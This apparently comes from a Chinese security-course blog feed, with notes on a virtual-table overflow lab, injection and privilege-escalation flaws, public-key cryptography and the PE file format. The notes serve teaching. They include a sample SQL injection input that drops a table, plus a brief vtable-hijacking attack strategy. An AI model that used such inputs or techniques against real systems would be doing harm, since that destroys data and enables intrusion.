data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/195c17615edfa3f9ee341b403e54329d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h3><p>充分利用<code>overflow.buf</code>这个缓冲区：overflow.buf的地址为<code>0x00428ba4</code> ，其倒数第四个字节开始地址为<code>0x00428c54</code>。Strlen里最后一个字符是0x00，需要加上。</p><ul><li>修改虚表地址：将对象overflow的虚表地址修改为数组shellcode的倒数第四个字节开始地址。</li><li>修改虚函数指针：修改数组shellcode最后4位（虚表）来指向overflow.buf的内存地址，即让虚函数指针指向保存shellcode的overflow.buf区域。</li></ul><p>VC IDE进行实际调试的时候，在语句“p-&gt;test();”处转入反汇编，继续单步调试，可以看到攻击成功，弹出failwest的对话框：</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/d73c151f780822915ad962d1c896fbbc.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/d73c151f780822915ad962d1c896fbbc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h1 id="其他类型漏洞"><a href="#其他类型漏洞" class="headerlink" title="其他类型漏洞"></a>其他类型漏洞</h1><h2 id="注入类漏洞"><a href="#注入类漏洞" class="headerlink" title="注入类漏洞"></a>注入类漏洞</h2><p>注入类攻击都具备一个共同的特点：<strong>来自外部的输入数据被当作代码或非预期的指令、数据被执行，从而将威胁引入到软件或者系统。</strong><br>根据应用程序的工作方式，将代码注入分为两大类：</p><ul><li><strong>二进制代码注入</strong>，即将计算机可以执行执行的二进制代码注入到其他应用程序的执行代码中。由于程序中某些缺陷导致<u>程序的控制器被劫持</u>，使得外部代码获得执行机会，从而实现特定的攻击目的；</li><li><strong>脚本注入</strong>，即通过特定的<strong>脚本解释类程序</strong>提交可被解释执行的数据。由于应用在输入的过滤上存在缺陷，导致注入的脚本数据被执行。</li></ul><p>下面介绍几种Web场景下的代码注入攻击。</p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>SQL（Structured query language，结构化查询语言）是操作数据库数据的结构化查询语言，用于读取、更新、增加或删除数据库中保存的信息。应用程序通过SQL语言来完成后台数据库中的数据的增加、删除、修改和查询。<br><strong>SQL注入是将Web页面的<u>原URL、表单域或数据包输入的参数</u>，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。</strong><br>如果Web应用程序的开发人员对用户所输入的数据不进行过滤或验证就直接传输给数据库，就可能导致拼接的异常SQL语句被执行，获取对数据库的信息以及提权，发生SQL注入攻击。</p><p><img src="/2023/03/13/ruan-jian-lou-dong-pian/96dcc87cffbb8ff43258ceefb80d3bea.png" class="lazyload placeholder" data-srcset="/2023/03/13/ruan-jian-lou-dong-pian/96dcc87cffbb8ff43258ceefb80d3bea.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>strKeyword = Request[“keyword”];<br>sqlQuery = “SELECT * FROM Articles WHERE Keywords LIKE ‘%<u>” +strKeyword+ “</u>%’ ”;</p><p>输入<code>Hack’; DROP TABLE Aritcles; --</code></p><p><code>SELECT * FROM Aritcles WHERE Keywords LIKE ‘%hack’; DROP TABLE Aritcles; --%’</code></p><p>–是注释符，<strong>结果是以中间的分号为标志分成两个部分</strong>，执行完<code> “SELECT * FROM Aritcles WHERE Keywords LIKE ‘%hack’”</code>后，将执行<code>” DROP TABLE Aritcles;”</code></p><h3 id="操作系统命令注入"><a href="#操作系统命令注入" class="headerlink" title="操作系统命令注入"></a>操作系统命令注入</h3><p>操作系统命令注入攻击（OS Command Injection）是指通过Web应用，执行非法的操作系统命令达到攻击的目的。<strong>大多数Web服务器都能够使用内置的API与服务器的操作系统进行几乎任何必需的交互，比如PHP中的<code>system</code>、<code>exec</code>和ASP中的<code>wscript</code>类函数。</strong>如果正确使用，这些API可以丰富Web应用的功能。但是，<u>如果应用程序向操作系统命令程序传送用户提交的输入，而且没有对输入进行过滤和检测，就可能遭受命令注入攻击。</u><br>许多定制和非定制web应用程序中都存在这种命令注入缺陷。在为企业服务器或防火墙、打印机和路由器之类的设备提供管理界面的应用程序中，这类缺陷尤其普遍。</p><h3 id="Web脚本语言注入"><a href="#Web脚本语言注入" class="headerlink" title="Web脚本语言注入"></a>Web脚本语言注入</h3><p>常用的ASP/PHP/JSP等<u>web脚本解释语言支持动态执行在运行时生成的代码这种特点，可以帮助开发者根据各种数据和条件动态修改程序代码</u>，这对于开发人员来说是有利的，但这也隐藏着巨大的风险。<br>这种类型的漏洞主要来自两个方面：<br>（1）<strong>合并了用户提交数据的代码的动态执行</strong>。攻击者通过提交精心设计输入，使得合并用户提交数据后的代码蕴含设定的非正常业务逻辑来实施特定攻击。<br>（2）<strong>根据用户提交的数据指定的代码文件的动态包含</strong>。<u>多数脚本语言都支持使用包含文件（include file）</u>，这种功能允许开发者把<u>可重复使用的代码插入到单个文件</u>中，在需要的时候再将它们包含到相关代码文件中。如果攻击者能修改这个文件中的代码，就让受此攻击的应用执行攻击者的代码。</p><h3 id="SOAP注入"><a href="#SOAP注入" class="headerlink" title="SOAP注入"></a>SOAP注入</h3><p><strong>SOAP（Simple Object Access Protocol，简单对象访问协议），是一个简单的基于XML的协议，它让应用程序跨HTTP进行信息交换。</strong>它主要用在Web服务中，<strong>通过浏览器访问的Web应用程序常常使用SOAP在后端应用程序组件之间进行通信。</strong><br>由于<strong>XML也是一种解释型语言</strong>，因此SOAP也易于遭受代码注入攻击。XML元素通过元字符&lt;&gt;和/以语法形式表示。如果用户提交的数据中包含这些字符，并被直接插入到SOAP消息中，攻击者就能够破坏消息的结构，进而破坏应用程序的逻辑或造成其他不利影响。</p><h2 id="权限类漏洞"><a href="#权限类漏洞" class="headerlink" title="权限类漏洞"></a>权限类漏洞</h2><p>绝大多数系统，都具备基于用户角色的访问控制功能，根据不同用户对其权限加以区分。但攻击者为了访问受限资源或使用额外功能，会利用系统存在的缺陷或漏洞，进行自身角色的<u>权限提升或权限扩展</u>。</p><p>权限越权又可以分为两种：<strong>水平越权与垂直越权</strong>。</p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p><strong>水平越权就是相同级别（权限）的用户或者同一角色的不同用户之间，可以越权访问、修改或者删除的非法操作。</strong>如果出现此类漏洞，那么将可能会造成大批量数据泄露，严重的甚至会造成用户信息被恶意篡改。水平权限漏洞一般出现在一个用户对象关联多个其他对象（个人资料、修改密码，订单信息，等）、并且要实现对关联对象的CURD的时候。<br>比如，当web应用程序接收到用户请求时，没有判断数据的所属人，或者在判断数据所属人时是从用户提交的参数中获取了userid，导致攻击者可以自行修改userid修改不属于自己的数据。</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p><strong>垂直越权又被分为向上越权与向下越权。</strong><br><strong>向上越权是指一个低权限用户或者根本没权限也可以做高权限用户相同的事情；向下越权是一个高级别用户可以访问一个低级别的用户信息。</strong>比如，在web应用中，如果后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公钥密码体系的基本概念</title>
      <link href="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/"/>
      <url>/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/</url>
      
        <content type="html"><![CDATA[<h2 id="公钥密码体系的基本概念"><a href="#公钥密码体系的基本概念" class="headerlink" title="公钥密码体系的基本概念"></a>公钥密码体系的基本概念</h2><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/7de202bcf3bffcc314867494185df164.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/7de202bcf3bffcc314867494185df164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>==现有一个带锁扣的盒子(加密算法)，采用传统的邮寄方式（网络通信），Alice如何把机密文件邮寄给Bob(Bob有一把锁和钥匙)？==</p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/4a94d16c801ac39a05e12fb789da4da4.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/4a94d16c801ac39a05e12fb789da4da4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>密钥交换体系基本思想</strong></p><p>如果Alice和Bob两个人能安全快速地协商出一把密钥，再结合传统的对称加密算法，也能达到数据安全传输的目的。</p><p>如何设计一个密钥交换体系，让A、B双方确定一把共同的密钥？</p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/0cf9445ab4629dcbc8958521dae337df.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/0cf9445ab4629dcbc8958521dae337df.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/66303d819e9d9ecfa20150ea2d2c8fd1.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/66303d819e9d9ecfa20150ea2d2c8fd1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/7109652823d2a32c78bf3829c5350f17.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/7109652823d2a32c78bf3829c5350f17.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><img src="381dcd29808a953dff2956a4c88bcf78.png" class="lazyload placeholder" data-srcset="381dcd29808a953dff2956a4c88bcf78.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="" style="zoom:50%;" /><h2 id="数论的基本概念和定理"><a href="#数论的基本概念和定理" class="headerlink" title="数论的基本概念和定理"></a>数论的基本概念和定理</h2><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/3e9a98ba585f7f03f651c135a04ca5fc.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/3e9a98ba585f7f03f651c135a04ca5fc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/ebf7695fb10b7fc4023d791d8746fd84.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/ebf7695fb10b7fc4023d791d8746fd84.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/40c5477bd18abb23b362f686ff691498.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/40c5477bd18abb23b362f686ff691498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/dd1364ba0df5a42919b90461b089c70e.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/dd1364ba0df5a42919b90461b089c70e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/8517257e327047aee09fa45ad4bf3b57.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/8517257e327047aee09fa45ad4bf3b57.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/3c710f8bf08cff2bf137ea78b9edecf8.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/3c710f8bf08cff2bf137ea78b9edecf8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/5067a4a3cdc8667466d3ef91a6809447.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/5067a4a3cdc8667466d3ef91a6809447.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/f441ecafa9f595a1a9c9af23ea375eea.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/f441ecafa9f595a1a9c9af23ea375eea.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/dd54054d4bd87c416288a7b0c11df9e8.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/dd54054d4bd87c416288a7b0c11df9e8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/50b4341a5b5fd986dd712227e8500ead.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/50b4341a5b5fd986dd712227e8500ead.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="Diffie-Hellman密钥交换"><a href="#Diffie-Hellman密钥交换" class="headerlink" title="Diffie-Hellman密钥交换"></a>Diffie-Hellman密钥交换</h2><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/70d10e8054f19b40a2d088840c375311.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/70d10e8054f19b40a2d088840c375311.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/78397003e089a2d2658be4ae4be17d48.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/78397003e089a2d2658be4ae4be17d48.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/b4a683fed21f6d863570d0652e562802.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/b4a683fed21f6d863570d0652e562802.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/90788e698241347e1b27f1fae4677e26.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/90788e698241347e1b27f1fae4677e26.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/b99e4f33bb1cf772763e03aeb16cdf8c.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/b99e4f33bb1cf772763e03aeb16cdf8c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/bdc88055bda650affae30c58aab47c5e.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/bdc88055bda650affae30c58aab47c5e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="RSA密码体系"><a href="#RSA密码体系" class="headerlink" title="RSA密码体系"></a>RSA密码体系</h2><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/5122a6022aac8adf83300e34cf49d537.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/5122a6022aac8adf83300e34cf49d537.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/6b0c03dea70b78d05219563c560c6d22.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/6b0c03dea70b78d05219563c560c6d22.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/a33d653ee4838849ce5d698f1fef0b1a.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/a33d653ee4838849ce5d698f1fef0b1a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/5fc1c072ecde9976c0bbdb6a33b08861.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/5fc1c072ecde9976c0bbdb6a33b08861.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/cfc26e0d46b05f845d7349f1a532ce66.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/cfc26e0d46b05f845d7349f1a532ce66.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/237266229c0273503209bfd164fab7ca.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/237266229c0273503209bfd164fab7ca.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/57b879ca577e1843b901dc41f57682dc.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/57b879ca577e1843b901dc41f57682dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="密钥分配与管理"><a href="#密钥分配与管理" class="headerlink" title="密钥分配与管理"></a>密钥分配与管理</h2><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/775200c446d3dd9efe2fef3447a6f533.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/775200c446d3dd9efe2fef3447a6f533.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/8006056ca6405c3a5b419892b00e702c.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/8006056ca6405c3a5b419892b00e702c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/b209d9bd7b00b5b7eae8f865d370db90.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/b209d9bd7b00b5b7eae8f865d370db90.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/ed51181d5403d49d30cafab5981cf4fa.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/ed51181d5403d49d30cafab5981cf4fa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/26ad3c6f3a46e348363a4cccba836242.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/26ad3c6f3a46e348363a4cccba836242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/1c28612843e93eace1c1c46cc427ad95.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/1c28612843e93eace1c1c46cc427ad95.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/09712f77412f9312abf336ebf7e4d751.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/09712f77412f9312abf336ebf7e4d751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/0bbbb55bc7a16e2236d3590d1b9836c8.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/0bbbb55bc7a16e2236d3590d1b9836c8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/eb0e655d0f794dbaa60945f6d0ddcf36.png" class="lazyload placeholder" data-srcset="/2023/03/13/gong-yao-mi-ma-ti-xi-he-mi-yao-guan-li/eb0e655d0f794dbaa60945f6d0ddcf36.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件调试基础</title>
      <link href="/2023/03/12/ruan-jian-diao-shi-ji-chu/"/>
      <url>/2023/03/12/ruan-jian-diao-shi-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h1><h2 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h2><p><strong>可执行文件</strong>之所以可以被操作系统加载且运行，是因为它们遵循相同的规范。PE（Portable Executable）是Win32平台下可执行文件遵守的数据格式。常见的可执行文件（如“*.exe”文件和“*.dll”文件）都是典型的PE文件。</p><p>一个可执行文件不光包含了<strong>二进制机器码</strong>，还会自带许多其他信息，如字符串、菜单、图标、位图、字体等。PE文件格式规定了所有的这些信息在可执行文件中如何组织。在程序被执行时，操作系统会按照PE文件格式的约定去相应的地方准确地定位各种类型的资源，并分别装入内存的不同区域。 </p><p>PE文件格式把可执行文件分成若干个<strong>数据节</strong>（section），不同的资源被存放在不同的节中。一个典型的PE文件中包含的节如下：</p><ul><li>rsrc<blockquote><p>存放程序的资源，如图标、菜单等。</p></blockquote></li><li>text<blockquote><p>由编译器产生，存放着二进制的机器代码，也是我们反汇编和调试的对象。</p></blockquote></li><li>idata<blockquote><p>可执行文件所使用的动态链接库等外来函数与文件的信息, 即输入表</p></blockquote></li><li>data<blockquote><p>初始化的数据块，如宏定义、全局变量、静态变量等。</p></blockquote></li></ul><p>如果是正常编译出的标准PE文件，其节信息往往是大致相同的。但这些section的名字只是为了方便人的记忆与使用，使用Microsoft Visual C++中的编译指示符：<br>                               <code>#pragma data_seg()</code><br>可以把代码中的任意部分编译到PE的任意节中，节名也可以自己定义，如果可执行文件经过了<strong>“加壳”处理</strong>，PE的节信息就会变得非常“古怪”。在Crack和反病毒分析中需要经常处理这类古怪的PE文件。</p><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><p>全称应该是<u>可执行程序资源压缩</u>，是<strong>保护文件</strong>的常用手段。 加壳过的程序可以直接运行，但是不能查看源代码。要经过<strong>脱壳</strong>才可以查看源代码。</p><p>加壳其实是利用特殊的算法，对EXE、DLL文件里的代码、资源进行<u>压缩、加密</u>。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行。<u>附加在原程序上的解压程序</u>通过Windows加载器载入内存后，<strong>先于原始程序执行，得到控制权</strong>，执行过程中对原始程序进行解密、还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分。</p><p>加上外壳后，原始程序代码<strong>在磁盘文件中一般是以加密后的形式存在</strong>，<strong>只在执行时在内存中还原</strong>，这样就可以比较<u>有效地防止对程序文件的非法修改和静态反编译</u></p><p>加壳工具通常分为压缩壳和加密壳两类。</p><ul><li>压缩壳的特点是减小软件体积大小，加密保护不是重点。</li><li>加密壳种类比较多，不同的壳侧重点不同，一些壳单纯保护程序，另一些壳<strong>提供额外的功能</strong>，如提供注册机制、使用次数、时间限制等。</li></ul><hr><h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><h2 id="Windows安全模式"><a href="#Windows安全模式" class="headerlink" title="Windows安全模式"></a>Windows安全模式</h2><p>为了防止用户程序访问并篡改操作系统的关键部分，Windows使用了2种处理器存取模式：用户模式和内核模式。用户程序运行在用户模式，而操作系统代码（如系统服务和设备驱动程序）则运行在内核模式。在内核模式下程序可以访问所有的内存和硬件，并使用所有的处理器指令。操作系统程序比用户程序有更高的权限，使得系统设计者可以确保用户程序不会意外的破坏系统的稳定性。</p><h2 id="虚拟内存-1"><a href="#虚拟内存-1" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中，物理内存非常复杂，需要进入<strong>Windows内核级别ring0</strong>才能看到。<u>通常，在用户模式下，用调试器看到的内存地址都是虚拟内存</u>。</p><p>用户编制程序时使用的地址称为虚拟地址或逻辑地址，其对应的存储空间称为虚拟内存或逻辑地址空间；而计算机物理内存的访问地址则称为实地址或物理地址，其对应的存储空间称为物理存储空间或主存空间。程序进行虚地址到实地址转换的过程称为<strong>程序的再定位。</strong></p><h2 id="进程空间"><a href="#进程空间" class="headerlink" title="进程空间"></a>进程空间</h2><p>在Windows系统中，在运行PE文件时，操作系统会自动加载该文件到内存，并为其映射出<strong>4GB的虚拟存储空间</strong>，然后继续运行，这就形成了所谓的<u>进程空间</u>。用户的PE文件被操作系统加载进内存后，PE对应的进程支配了自己独立的4GB虚拟空间。在这个空间中定位的地址称为虚拟内存地址（Virtual Address，VA）。<br>到了现在，系统运行在X64架构的硬件上，可访问的内存也突破了以前4GB的限制，但是独立的进程拥有独立的虚拟地址空间的<strong>内存管理机制</strong>还在沿用。</p><h2 id="PE文件和虚拟内存的映射"><a href="#PE文件和虚拟内存的映射" class="headerlink" title="PE文件和虚拟内存的映射"></a>PE文件和虚拟内存的映射</h2><p>在调试漏洞时，可能经常需要做这样两种操作：</p><ul><li><strong>静态反汇编工具</strong>看到的PE文件中某条指令的位置是相对于磁盘文件而言的，即所谓的文件偏移，我们可能还需要知道这条指令在内存中所处的位置，即虚拟内存地址。</li><li>反之，在<strong>调试</strong>时看到的某条指令的地址是虚拟内存地址，我们也经常需要回到PE文件中找到这条指令对应的机器码。</li></ul><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>相对虚拟地址(RVA)</strong></p><p>相对虚拟地址是内存地址相对于<strong>映射基址</strong>的<u>偏移量</u>。</p><p><strong>虚拟内存地址(VA)</strong></p><p>PE文件中的指令被装入内存后的地址。</p><p><strong>文件偏移地址(File Offset)</strong></p><p>数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。</p><p><strong>装载基址(Image Base)</strong></p><p>PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址是<u>0x00400000</u>，DLL文件是<u>0x10000000</u>。<br>这些位置可以通过修改编译选项更改。</p><h3 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h3><p><code>VA=Image Base+RVA</code></p><p><img src="/2023/03/12/ruan-jian-diao-shi-ji-chu/b13105cc7240aea8122068dd1d276f77.png" class="lazyload 